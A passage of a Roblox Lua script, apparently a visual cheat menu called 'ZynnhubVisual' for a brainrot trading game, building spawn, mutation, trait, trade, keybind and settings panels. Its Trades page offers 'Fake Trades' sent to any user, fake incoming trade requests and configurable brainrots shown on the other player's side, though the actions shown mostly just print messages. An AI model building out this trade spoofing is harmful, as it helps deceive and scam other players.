    tCl.MouseButton1Click:Connect(function()
        if selectedTraits[tName] then
            selectedTraits[tName]=nil; Tw(tRow,{BackgroundColor3=CFG.PrimaryColor}); tCk.Text=""
        else
            selectedTraits[tName]=true; Tw(tRow,{BackgroundColor3=CFG.SelectedColor}); tCk.Text="✔"
        end
        UpdateTraitsLabel()
    end)
    traitRows[i]={frame=tRow,name=tName:lower(),check=tCk,traitName=tName}
end

allBtn.MouseButton1Click:Connect(function()
    for _,e in ipairs(traitRows) do
        if e.frame.Visible then
            selectedTraits[e.traitName]=true; Tw(e.frame,{BackgroundColor3=CFG.SelectedColor}); e.check.Text="✔"
        end
    end
    UpdateTraitsLabel()
end)
clearTraitBtn.MouseButton1Click:Connect(function()
    selectedTraits={}
    for _,e in ipairs(traitRows) do Tw(e.frame,{BackgroundColor3=CFG.PrimaryColor}); e.check.Text="" end
    UpdateTraitsLabel()
end)
traitSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    local q=traitSearchBox.Text:lower()
    for _,e in ipairs(traitRows) do e.frame.Visible=(q=="" or e.name:find(q,1,true)~=nil) end
end)

-- ========================
-- MUTATION CARD
-- ========================
local mutCard=MakeCard(bScroll,4)
Pad(8,8,8,8,mutCard); VList(mutCard,3)

local mutHeader=Mk("Frame",{Size=UDim2.new(1,0,0,26),BackgroundTransparency=1,LayoutOrder=1,Parent=mutCard})
Mk("TextLabel",{Size=UDim2.new(0.55,0,1,0),BackgroundTransparency=1,Text="Mutation",
    TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,Parent=mutHeader})
local mutSelLbl=Mk("TextLabel",{
    Size=UDim2.new(0.45,0,1,0),Position=UDim2.new(0.55,0,0,0),
    BackgroundTransparency=1,Text="Selected: None",TextColor3=CFG.AccentColor,
    TextSize=12,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Right,Parent=mutHeader,
})
Mk("Frame",{Size=UDim2.new(1,0,0,1),BackgroundColor3=CFG.BorderColor,BorderSizePixel=0,LayoutOrder=2,Parent=mutCard})

local mutRows={}
local selectedMutIdx=1

local function SetMutHL(idx)
    for i,e in ipairs(mutRows) do
        if i==idx then
            Tw(e.frame,{BackgroundColor3=CFG.SelectedColor}); e.ck.Text="✔"
        else
            local dc=i%2==0 and Color3.fromRGB(28,28,33) or Color3.fromRGB(24,24,29)
            Tw(e.frame,{BackgroundColor3=dc}); e.ck.Text=""
        end
    end
end

for i,mName in ipairs(MutationData) do
    local dc=i%2==0 and Color3.fromRGB(28,28,33) or Color3.fromRGB(24,24,29)
    local mRow=Mk("Frame",{
        Size=UDim2.new(1,0,0,34),BackgroundColor3=dc,
        BorderSizePixel=0,LayoutOrder=i+2,Parent=mutCard,
    })
    Cor(6,mRow)
    Mk("TextLabel",{Size=UDim2.new(1,-40,1,0),Position=UDim2.new(0,10,0,0),
        BackgroundTransparency=1,Text=mName,TextColor3=CFG.TextColor,
        TextSize=13,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,Parent=mRow})
    local mCk=Mk("TextLabel",{
        Size=UDim2.new(0,28,1,0),Position=UDim2.new(1,-32,0,0),
        BackgroundTransparency=1,Text=mName=="None" and "✔" or "",
        TextColor3=CFG.GreenColor,TextSize=14,Font=CFG.Font,
        TextXAlignment=Enum.TextXAlignment.Center,Parent=mRow,
    })
    local mCl=Mk("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",Parent=mRow})
    if mName=="None" then Tw(mRow,{BackgroundColor3=CFG.SelectedColor}) end
    local ci=i
    mCl.MouseButton1Click:Connect(function()
        selectedMutIdx=ci; State.SelectedMutation=mName
        mutSelLbl.Text="Selected: "..mName; SetMutHL(ci)
    end)
    mutRows[i]={frame=mRow,ck=mCk}
end

-- ========================
-- BOTTOM BUTTONS
-- ========================
local botRow=Mk("Frame",{Size=UDim2.new(1,0,0,44),BackgroundTransparency=1,LayoutOrder=5,Parent=bScroll})
HList(botRow,8)

local spawnBtn=Mk("TextButton",{
    Size=UDim2.new(0,100,0,38),BackgroundColor3=CFG.AccentColor,BorderSizePixel=0,
    Text="Spawn",TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,Parent=botRow,
})
Cor(8,spawnBtn)
spawnBtn.MouseButton1Click:Connect(function()
    print("[ZynnhubVisual] Spawn → Brainrot:"..(State.SelectedBrainrot or "None").." | Mutation:"..State.SelectedMutation)
end)

local csBtn=Mk("TextButton",{
    Size=UDim2.new(0,100,0,38),BackgroundColor3=CFG.PrimaryColor,BorderSizePixel=0,
    Text="Clear Slot",TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,Parent=botRow,
})
Cor(8,csBtn); Str(CFG.BorderColor,1,csBtn)

local caBtn=Mk("TextButton",{
    Size=UDim2.new(0,100,0,38),BackgroundColor3=CFG.PrimaryColor,BorderSizePixel=0,
    Text="Clear All",TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,Parent=botRow,
})
Cor(8,caBtn); Str(CFG.BorderColor,1,caBtn)
caBtn.MouseButton1Click:Connect(function()
    selectedBrainrotIdx=nil; State.SelectedBrainrot=nil; SetBrainrotHL(nil); selBar.Visible=false
    selectedMutIdx=1; State.SelectedMutation="None"; mutSelLbl.Text="Selected: None"; SetMutHL(1)
    selectedTraits={}
    for _,e in ipairs(traitRows) do Tw(e.frame,{BackgroundColor3=CFG.PrimaryColor}); e.check.Text="" end
    UpdateTraitsLabel()
end)

-- ========================
-- PAGE: TRADES
-- ========================
local TradesPage=Mk("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,Parent=ContentArea})
Pages["Trades"]=TradesPage
local tScroll=MakeScroll(TradesPage)

local ftC=MakeCard(tScroll,1); ftC.Size=UDim2.new(1,0,0,64); ftC.AutomaticSize=Enum.AutomaticSize.None
MakeToggle(ftC,"Fake Trades","Allow sending fake trades to any user",State.FakeTrades,function(v)State.FakeTrades=v end)

local osloC=MakeCard(tScroll,2); osloC.Size=UDim2.new(1,0,0,64); osloC.AutomaticSize=Enum.AutomaticSize.None
Pad(10,14,10,14,osloC)
Mk("TextLabel",{Size=UDim2.new(0.6,0,0,20),BackgroundTransparency=1,Text="Other Slots",TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,Parent=osloC})
Mk("TextLabel",{Size=UDim2.new(0.6,0,0,16),Position=UDim2.new(0,0,0,22),BackgroundTransparency=1,Text="Set filled / total (empty = auto)",TextColor3=CFG.SubTextColor,TextSize=11,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,Parent=osloC})
Mk("TextLabel",{Size=UDim2.new(0.4,0,0,24),Position=UDim2.new(0.6,0,0.5,-12),BackgroundTransparency=1,Text="auto  /  auto",TextColor3=CFG.SubTextColor,TextSize=13,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Right,Parent=osloC})

local rcvC=MakeCard(tScroll,3); rcvC.Size=UDim2.new(1,0,0,92); rcvC.AutomaticSize=Enum.AutomaticSize.None
Pad(10,14,10,14,rcvC)
Mk("TextLabel",{Size=UDim2.new(1,0,0,20),BackgroundTransparency=1,Text="Receive Trade",TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,Parent=rcvC})
Mk("TextLabel",{Size=UDim2.new(1,0,0,16),Position=UDim2.new(0,0,0,22),BackgroundTransparency=1,Text="Type a username to receive a fake incoming trade request.",TextColor3=CFG.SubTextColor,TextSize=11,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,Parent=rcvC})
local riBg=Mk("Frame",{Size=UDim2.new(0.58,0,0,32),Position=UDim2.new(0,0,1,-42),BackgroundColor3=CFG.SecondaryColor,BorderSizePixel=0,Parent=rcvC})
Cor(8,riBg); Str(CFG.BorderColor,1,riBg)
Mk("TextBox",{Size=UDim2.new(1,-12,1,-8),Position=UDim2.new(0,6,0,4),BackgroundTransparency=1,Text="DADARBERDEDAR31",TextColor3=CFG.TextColor,TextSize=12,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,Parent=riBg})
local rvBtn=Mk("TextButton",{Size=UDim2.new(0.4,-4,0,32),Position=UDim2.new(0.6,4,1,-42),BackgroundColor3=CFG.AccentColor,BorderSizePixel=0,Text="Receive Trade",TextColor3=CFG.TextColor,TextSize=12,Font=CFG.Font,Parent=rcvC})
Cor(8,rvBtn)

local osC=MakeCard(tScroll,4); Pad(10,14,10,14,osC); VList(osC,6)
Mk("TextLabel",{Size=UDim2.new(1,0,0,20),BackgroundTransparency=1,Text="Other Side Brainrots",TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,Parent=osC})
Mk("TextLabel",{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Text="Configure the brainrots shown on the other player's side",TextColor3=CFG.SubTextColor,TextSize=11,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=2,Parent=osC})
local cRow=Mk("Frame",{Size=UDim2.new(1,0,0,30),BackgroundTransparency=1,LayoutOrder=3,Parent=osC})
local osCount=1
local cLbl=Mk("TextLabel",{Size=UDim2.new(0,28,0,28),BackgroundColor3=CFG.AccentColor,BorderSizePixel=0,Text="1",TextColor3=CFG.TextColor,TextSize=13,Font=CFG.Font,Parent=cRow})
Cor(6,cLbl)
local mB=Mk("TextButton",{Size=UDim2.new(0,28,0,28),Position=UDim2.new(0,34,0,0),BackgroundColor3=CFG.PrimaryColor,BorderSizePixel=0,Text="-",TextColor3=CFG.TextColor,TextSize=16,Font=CFG.Font,Parent=cRow})
Cor(6,mB); Str(CFG.BorderColor,1,mB)
local pB=Mk("TextButton",{Size=UDim2.new(0,28,0,28),Position=UDim2.new(0,68,0,0),BackgroundColor3=CFG.PrimaryColor,BorderSizePixel=0,Text="+",TextColor3=CFG.TextColor,TextSize=16,Font=CFG.Font,Parent=cRow})
Cor(6,pB); Str(CFG.BorderColor,1,pB)
mB.MouseButton1Click:Connect(function() osCount=math.max(1,osCount-1); cLbl.Text=tostring(osCount) end)
pB.MouseButton1Click:Connect(function() osCount=osCount+1; cLbl.Text=tostring(osCount) end)

local function DDLbl(p,t,o)
    Mk("TextLabel",{Size=UDim2.new(1,0,0,18),BackgroundTransparency=1,Text=t,TextColor3=CFG.SubTextColor,TextSize=11,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=o,Parent=p})
end
local function DD(p,t,o)
    local d=Mk("TextButton",{Size=UDim2.new(1,0,0,34),BackgroundColor3=CFG.SecondaryColor,BorderSizePixel=0,Text=t.."  ▾",TextColor3=CFG.TextColor,TextSize=13,Font=CFG.FontRegular,LayoutOrder=o,Parent=p})
    Cor(8,d); Str(CFG.BorderColor,1,d); return d
end
DDLbl(osC,"Brainrot",4); DD(osC,"Dragon Cannelloni",5)
DDLbl(osC,"Mutation",6); DD(osC,"None",7)
DDLbl(osC,"Trait(s)",8); DD(osC,"None",9)

-- ========================
-- PAGE: KEYBINDS
-- ========================
local KbPage=Mk("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,Parent=ContentArea})
Pages["Keybinds"]=KbPage
local kScroll=MakeScroll(KbPage)
for i,kb in ipairs(KeybindData) do
    local kc=MakeCard(kScroll,i)
    kc.Size=UDim2.new(1,0,0,kb.sub~="" and 60 or 48); kc.AutomaticSize=Enum.AutomaticSize.None
    Mk("TextLabel",{Size=UDim2.new(0.7,0,0,20),Position=UDim2.new(0,14,0,kb.sub~="" and 10 or 14),BackgroundTransparency=1,Text=kb.action,TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,Parent=kc})
    if kb.sub~="" then
        Mk("TextLabel",{Size=UDim2.new(0.7,0,0,16),Position=UDim2.new(0,14,0,30),BackgroundTransparency=1,Text=kb.sub,TextColor3=CFG.SubTextColor,TextSize=11,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,Parent=kc})
    end
    local kt=Mk("TextButton",{Size=UDim2.new(0,110,0,30),Position=UDim2.new(1,-124,0.5,-15),BackgroundColor3=Color3.fromRGB(40,40,50),BorderSizePixel=0,Text=kb.key,TextColor3=CFG.TextColor,TextSize=12,Font=CFG.Font,Parent=kc})
    Cor(6,kt); Str(CFG.BorderColor,1,kt)
end

-- ========================
-- PAGE: SETTINGS
-- ========================
local SetPage=Mk("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,Parent=ContentArea})
Pages["Settings"]=SetPage
local sScroll=MakeScroll(SetPage)

local sbC=MakeCard(sScroll,1); sbC.Size=UDim2.new(1,0,0,64); sbC.AutomaticSize=Enum.AutomaticSize.None
MakeToggle(sbC,"Save Brainrots","Restore spawned brainrots on rejoin",State.SaveBrainrots,function(v)State.SaveBrainrots=v end)
local ahC=MakeCard(sScroll,2); ahC.Size=UDim2.new(1,0,0,64); ahC.AutomaticSize=Enum.AutomaticSize.None
MakeToggle(ahC,"Auto Hide GUI","Hide the menu on load",State.AutoHideGUI,function(v)State.AutoHideGUI=v end)

local rjC=MakeCard(sScroll,3); rjC.Size=UDim2.new(1,0,0,64); rjC.AutomaticSize=Enum.AutomaticSize.None
Pad(10,14,10,14,rjC)
Mk("TextLabel",{Size=UDim2.new(0.6,0,0,20),BackgroundTransparency=1,Text="Rejoin Server",TextColor3=CFG.TextColor,TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,Parent=rjC})
Mk("TextLabel",{Size=UDim2.new(0.6,0,0,16),Position=UDim2.new(0,0,0,22),BackgroundTransparency=1,Text="Rejoin same server",TextColor3=CFG.SubTextColor,TextSize=11,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,Parent=rjC})
local rjBtn=Mk("TextButton",{Size=UDim2.new(0,80,0,32),Position=UDim2.new(1,-94,0.5,-16),BackgroundColor3=CFG.AccentColor,BorderSizePixel=0,Text="Rejoin",TextColor3=CFG.TextColor,TextSize=13,Font=CFG.Font,Parent=rjC})
Cor(8,rjBtn)
rjBtn.MouseButton1Click:Connect(function() game:GetService("TeleportService"):Teleport(game.PlaceId,LocalPlayer) end)

-- ========================
-- TAB SWITCHING
-- ========================
local function SwitchTab(name)
    State.ActiveTab=name
    for n,page in pairs(Pages) do page.Visible=(n==name) end
    for n,btn in pairs(TabButtons) do
        Tw(btn,{BackgroundTransparency=n==name and 0 or 1, TextColor3=n==name and CFG.TextColor or CFG.SubTextColor})
    end
end
for name,btn in pairs(TabButtons) do
    btn.MouseButton1Click:Connect(function() SwitchTab(name) end)
end
SwitchTab("Brainrots")

-- ========================
-- KEYBIND TOGGLE
-- ========================
local lastCtrl=0
UserInputService.InputBegan:Connect(function(inp)
    if inp.KeyCode==Enum.KeyCode.LeftControl then
        local now=tick()
        if now-lastCtrl<0.4 then
            State.GuiVisible=not State.GuiVisible; MainFrame.Visible=State.GuiVisible
        end
        lastCtrl=now
    elseif inp.KeyCode==Enum.KeyCode.E then
        print("[ZynnhubVisual] Receive Trade Notification triggered")
    elseif inp.KeyCode==Enum.KeyCode.Q then
        print("[ZynnhubVisual] Add Other Side Brainrots triggered")
    elseif inp.KeyCode==Enum.KeyCode.T then
        game:GetService("TeleportService"):Teleport(game.PlaceId,LocalPlayer)
    end
end)

-- GUI langsung muncul otomatis setelah loading selesai
MainFrame.Visible = true
State.GuiVisible  = true

print("[ZynnhubVisual] GUI Loaded! Press LeftControl twice to toggle.")
